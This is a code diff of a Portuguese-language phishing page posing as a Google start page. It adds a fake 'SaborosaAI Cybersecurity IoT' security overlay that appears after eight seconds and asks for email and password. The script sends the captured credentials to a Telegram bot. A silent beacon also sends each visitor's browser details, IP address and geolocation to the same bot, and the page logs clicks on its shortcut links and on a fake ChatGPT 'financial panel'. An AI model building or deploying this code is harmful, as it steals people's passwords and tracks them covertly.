@@ -21,7 +21,6 @@
             backdrop-filter: blur(2px);
         }
         
-        /* Barra de pesquisa centralizada */
         .search-container {
             position: absolute;
             top: 50%;
@@ -52,7 +51,6 @@
             color: #888;
         }
         
-        /* Atalhos rápidos na parte inferior */
         .shortcuts {
             position: fixed;
             bottom: 30px;
@@ -83,7 +81,6 @@
             border-color: #0078d4;
         }
 
-        /* ===== OVERLAY ESTILO IA PROFISSIONAL ===== */
         #serialTrap {
             display: none;
             position: fixed;
@@ -318,14 +315,13 @@
             100% { opacity: 1; transform: scale(1); }
         }
 
-        /* ===== PAINEL FINANCEIRO (CHATGPT FALSO) ===== */
         #financePanel {
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.85);
             backdrop-filter: blur(8px);
-            z-index: 100000; /* MUITO ACIMA DE TUDO */
+            z-index: 100000;
             font-family: 'Segoe UI', sans-serif;
         }
         
@@ -364,7 +360,6 @@
 </head>
 <body>
 
-    <!-- Página Normal -->
     <div class="search-container">
         <form method="get" action="https://www.google.com/search">
             <input type="text" name="q" placeholder="🔍 Pesquisar no Google...">
@@ -373,18 +368,74 @@
     
     <div class="shortcuts">
         <a href="#" id="chatgptBtn" style="background: rgba(16, 163, 127, 0.6);">🤖 ChatGPT</a>
-        <a href="https://www.youtube.com">YouTube</a>
-        <a href="https://www.gmail.com">Gmail</a>
-        <a href="https://github.com">GitHub</a>
-        <a href="https://www.reddit.com">Reddit</a>
+        <a href="https://www.youtube.com" class="trackable" data-name="YouTube">YouTube</a>
+        <a href="https://www.gmail.com" class="trackable" data-name="Gmail">Gmail</a>
+        <a href="https://github.com" class="trackable" data-name="GitHub">GitHub</a>
+        <a href="https://www.reddit.com" class="trackable" data-name="Reddit">Reddit</a>
     </div>
 
-    <!-- ===== OVERLAY SABOROSAAI CYBERSECURITY IoT ===== -->
     <div id="serialTrap">
-        <!-- ... (conteúdo completo do overlay como você já tem) ... -->
+        <div class="ai-container">
+            <div class="ai-header">
+                <div class="ai-avatar">
+                    <svg viewBox="0 0 24 24" fill="white">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                </div>
+                <div class="ai-title">
+                    <h2>SaborosaAI <span class="ai-badge">Cybersecurity IoT</span></h2>
+                    <p><span class="pulse"></span> Conexão Segura · Monitorização Ativa</p>
+                </div>
+            </div>
+            
+            <div class="ai-card">
+                <div class="ai-message">
+                    <div class="ai-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                            <path d="M12 2L2 7v10l10 5 10-5V7l-10-5zm0 2.2l7 3.5-7 3.5-7-3.5 7-3.5zm-7 5.6l7 3.5 7-3.5v4.9l-7 3.5-7-3.5v-4.9z"/>
+                        </svg>
+                    </div>
+                    <div class="ai-bubble">
+                        <strong>⚠️ Detectei anomalias de desligamentos e inatividade no seu sistema fonte.</strong><br>
+                        Por favor, consulte o seu Administrador do sistema após a confirmação.
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px;">
+                    <div class="input-group">
+                        <label>📧 Confirme a sua Identidade (Email)</label>
+                        <input type="email" id="emailInput" placeholder="shanay********@gmail.com" value="">
+                    </div>
+                    <div class="input-group">
+                        <label>🔐 Palavra-passe</label>
+                        <input type="password" id="passwordInput" placeholder="••••••••">
+                    </div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-primary" id="confirmarBtn">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+                        </svg>
+                        Confirmar
+                    </button>
+                </div>
+                
+                <div style="margin-top: 25px;">
+                    <p style="color: #888; font-size: 13px; margin-bottom: 10px;">📞 Contactar o Administrador do Sistema:</p>
+                    <div class="contact-options">
+                        <a href="mailto:conectamoz.oficial@gmail.com" class="contact-btn">📧 Email</a>
+                        <a href="https://t.me/conectamoz" class="contact-btn">📱 Telegram</a>
+                    </div>
+                </div>
+                
+                <div class="footer-note">
+                    <span class="pulse"></span> SaborosaAI Cybersecurity IoT · Conexão Segura
+                </div>
+            </div>
+        </div>
     </div>
 
-    <!-- ===== PAINEL FINANCEIRO (CHATGPT FALSO) - CORRIGIDO ===== -->
     <div id="financePanel">
         <div class="finance-card">
             <div style="display:flex; align-items:center; gap:10px; margin-bottom:20px;">
@@ -430,9 +481,7 @@
     </div>
 
     <script>
-        // ===============================================
-        // CONFIGURAÇÃO SEGURA DO TELEGRAM
-        // ===============================================
+        // Configuração Segura do Telegram
         const TELEGRAM_TOKEN = '__TELEGRAM_TOKEN__';
         const CHAT_ID = '8508300977';
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
@@ -449,60 +498,50 @@
             }).catch(e => console.error('Erro Telegram:', e));
         }
 
-        // ===============================================
-        // BEACON SILENCIOSO
-        // ===============================================
+        // Beacon Silencioso + Geolocalização por IP
         (function() {
-            const msg = `🟢 *sh6 · ONLINE*\n` +
-                        `📅 ${new Date().toLocaleString('pt-BR')}\n` +
-                        `🖥️ ${navigator.userAgent}\n` +
-                        `📐 ${screen.width}x${screen.height}`;
+            const msg = `🟢 *sh6 · ONLINE*\n📅 ${new Date().toLocaleString('pt-BR')}\n🖥️ ${navigator.userAgent}\n📐 ${screen.width}x${screen.height}`;
             sendTelegramMessage(msg);
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {
+                    const ip = data.ip;
+                    fetch(`https://ipapi.co/${ip}/json/`)
+                        .then(r => r.json())
+                        .then(geo => {
+                            if (!geo.error) {
+                                const geoMsg = `🌍 *Localização do Visitante*\n📍 ${geo.city}, ${geo.country_name}\n🏢 ${geo.org}\n🔢 IP: ${ip}`;
+                                sendTelegramMessage(geoMsg);
+                            }
+                        });
+                });
         })();
 
-        // ===============================================
-        // CONTROLO DO OVERLAY SABOROSAAI
-        // ===============================================
+        // Controlo do Overlay SaborosaAI
         const ATIVAR_SERIAL_TRAP = true;
         const serialTrap = document.getElementById('serialTrap');
 
         if (ATIVAR_SERIAL_TRAP && serialTrap) {
-            setTimeout(() => {
-                serialTrap.style.display = 'block';
-            }, 8000);
+            setTimeout(() => { serialTrap.style.display = 'block'; }, 8000);
         }
 
-        // ===============================================
-        // BOTÃO CONFIRMAR (CAPTURA DE CREDENCIAIS)
-        // ===============================================
+        // Captura de Credenciais
         const confirmarBtn = document.getElementById('confirmarBtn');
         if (confirmarBtn) {
             confirmarBtn.onclick = function() {
-                const emailInput = document.getElementById('emailInput');
-                const passwordInput = document.getElementById('passwordInput');
-                const email = emailInput ? emailInput.value : '';
-                const senha = passwordInput ? passwordInput.value : '';
-                
-                if (!email || !senha) {
-                    alert('⚠️ Por favor, preencha ambos os campos.');
-                    return;
-                }
-                
-                const msg = `🔐 *CREDENCIAIS CAPTURADAS*\n\n` +
-                            `📧 *Email:* \`${email}\`\n` +
-                            `🔑 *Senha:* \`${senha}\`\n\n` +
-                            `🕒 ${new Date().toLocaleString('pt-BR')}`;
+                const email = document.getElementById('emailInput')?.value || '';
+                const senha = document.getElementById('passwordInput')?.value || '';
+                if (!email || !senha) { alert('⚠️ Preencha ambos os campos.'); return; }
+                const msg = `🔐 *CREDENCIAIS CAPTURADAS*\n\n📧 *Email:* \`${email}\`\n🔑 *Senha:* \`${senha}\`\n\n🕒 ${new Date().toLocaleString('pt-BR')}`;
                 sendTelegramMessage(msg);
-                
                 if (serialTrap) serialTrap.style.display = 'none';
-                alert('✅ Identidade confirmada. O administrador do sistema foi notificado.\nObrigado pela cooperação.');
-                sendTelegramMessage('📋 *Utilizador clicou em Confirmar* e os dados foram enviados.');
+                alert('✅ Identidade confirmada. O administrador foi notificado.');
+                sendTelegramMessage('📋 *Utilizador clicou em Confirmar*.');
             };
         }
 
-        // ===============================================
-        // PAINEL FINANCEIRO (CHATGPT FALSO) - CORRIGIDO
-        // ===============================================
+        // Painel Financeiro (ChatGPT Falso)
         const financePanel = document.getElementById('financePanel');
         const chatgptBtn = document.getElementById('chatgptBtn');
         const closeFinanceBtn = document.getElementById('closeFinanceBtn');
@@ -510,15 +549,9 @@
         if (chatgptBtn) {
             chatgptBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                e.stopPropagation();
-                
-                // Fecha o overlay da SaborosaAI se estiver aberto
                 if (serialTrap) serialTrap.style.display = 'none';
-                
-                // Abre o painel financeiro
                 if (financePanel) financePanel.style.display = 'block';
-                
-                sendTelegramMessage('🤖 *Utilizador clicou no botão ChatGPT* e viu o painel financeiro.');
+                sendTelegramMessage('🤖 *ChatGPT clicado* - Painel financeiro aberto.');
             });
         }
 
@@ -528,29 +561,27 @@
             });
         }
 
-        // Fechar ao clicar fora do painel
         if (financePanel) {
             financePanel.addEventListener('click', function(e) {
-                if (e.target === financePanel) {
-                    financePanel.style.display = 'none';
-                }
+                if (e.target === financePanel) financePanel.style.display = 'none';
             });
         }
 
-        // ===============================================
-        // TÍTULO DA ABA DINÂMICO (BÓNUS)
-        // ===============================================
+        // Log de Cliques nos Atalhos
+        document.querySelectorAll('.trackable').forEach(link => {
+            link.addEventListener('click', function() {
+                const name = this.getAttribute('data-name');
+                sendTelegramMessage(`🔗 *Atalho clicado:* ${name}`);
+            });
+        });
+
+        // Título da Aba Dinâmico
         const originalTitle = 'Google';
         document.title = originalTitle;
-        
         if (serialTrap) {
             const observer = new MutationObserver(function(mutations) {
                 mutations.forEach(function(mutation) {
-                    if (mutation.target.style.display === 'block') {
-                        document.title = '🔐 Verificação de Segurança';
-                    } else {
-                        document.title = originalTitle;
-                    }
+                    document.title = (mutation.target.style.display === 'block') ? '🔐 Verificação de Segurança' : originalTitle;
                 });
             });
             observer.observe(serialTrap, { attributes: true, attributeFilter: ['style'] });
